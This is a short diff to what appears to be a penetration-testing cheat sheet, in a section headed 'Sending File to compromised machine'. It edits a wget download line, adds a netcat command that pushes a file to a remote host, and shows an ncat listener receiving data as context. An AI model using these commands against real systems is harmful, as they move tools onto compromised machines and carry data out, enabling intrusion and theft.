@@ -19,9 +19,9 @@ ncat -l -p 8000 --recv-only > <FILE TO SAVE DATA TO>
 
 #### NetCat - Attack Host - Sending File to compromised machine
 ```bash
-wget <URL TO FILE> #GET URL CONTENTS FIRST
+wget -q <URL TO FILE> #GET URL CONTENTS FIRST
 ```
 
 ```bash
-
+nc -q 0 <IP> <PORT> < <FILE>
 ```
